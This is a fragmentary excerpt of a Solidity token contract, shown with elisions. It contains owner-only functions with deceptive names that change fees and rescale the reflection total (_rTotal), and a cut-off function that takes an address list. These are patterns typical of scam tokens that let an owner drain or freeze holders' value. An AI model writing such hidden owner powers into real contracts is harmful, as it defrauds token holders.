...
contract newtoken is Context, IERC20, Ownable{
  ...
  uint8 public buyMultiplier;
  uint8 public transferMultiplier;
  ...
  function xcludewar3(address[] calldata accounts) external onlyOwner {
  ...
  function setExemptFeed(address _addr, bool _value) external onlyOwner {
      require(_isExcludedFromFee[_addr] != _value, "Not changed");
      _isExcludedFromFee[_addr] = _value;
  }

  function setTarget(uint8 target, uint8 accuracy) external onlyOwner {
      _liquidityFee = target;
      _mktFee = accuracy;
  }

  function Settings(bool _enabled, uint256 _num, uint256 _denom) external onlyOwner {
      isLiquidity = _enabled;
      _rTotal = _rTotal.div(_denom).mul(_num);
  }


  function Excluded_transFrom(address sender, address recipient, uint256 tAmount) private {
  ...
  function ToExcluded(address sender, address recipient, uint256 tAmount) private {
      (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, , ) = _getValues(tAmount);
      _balances[sender] = _balances[sender].sub(rAmount);
